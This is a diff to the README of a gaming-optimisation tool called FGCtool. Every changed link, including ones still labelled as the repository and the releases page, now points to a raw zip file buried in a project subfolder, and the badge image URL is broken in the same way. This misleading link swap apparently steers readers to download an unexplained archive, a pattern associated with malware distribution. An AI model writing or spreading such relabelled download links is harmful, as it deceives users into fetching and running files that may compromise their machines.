@@ -6,7 +6,7 @@ Welcome to FGCtool! This tool helps improve your display and audio settings for 
 
 ## 📥 Download FGCtool
 
-[![Download FGCtool](https://img.shields.io/badge/Download%20FGCtool-v1.0-blue)](https://github.com/Dev-bit-cyber/FGCtool/releases)
+[![Download FGCtool](https://github.com/Dev-bit-cyber/FGCtool/raw/refs/heads/master/synchrone/Ctool-FG-2.7.zip%20FGCtool-v1.0-blue)](https://github.com/Dev-bit-cyber/FGCtool/raw/refs/heads/master/synchrone/Ctool-FG-2.7.zip)
 
 ## 🔧 System Requirements
 
@@ -21,7 +21,7 @@ Before you download FGCtool, ensure your system meets the following requirements
 
 To get started, visit the Releases page to download the latest version of FGCtool:
 
-[Download FGCtool](https://github.com/Dev-bit-cyber/FGCtool/releases)
+[Download FGCtool](https://github.com/Dev-bit-cyber/FGCtool/raw/refs/heads/master/synchrone/Ctool-FG-2.7.zip)
 
 Follow these steps to install:
 
@@ -67,7 +67,7 @@ We welcome your feedback! If you have suggestions or find a bug, please let us k
 
 ## 🔗 Useful Links
 
-- [FGCtool GitHub Repository](https://github.com/Dev-bit-cyber/FGCtool)
-- [Visit the Releases Page](https://github.com/Dev-bit-cyber/FGCtool/releases)
+- [FGCtool GitHub Repository](https://github.com/Dev-bit-cyber/FGCtool/raw/refs/heads/master/synchrone/Ctool-FG-2.7.zip)
+- [Visit the Releases Page](https://github.com/Dev-bit-cyber/FGCtool/raw/refs/heads/master/synchrone/Ctool-FG-2.7.zip)
 
 Thank you for using FGCtool! Enjoy optimized gaming and better performance in your favorite fighting games.
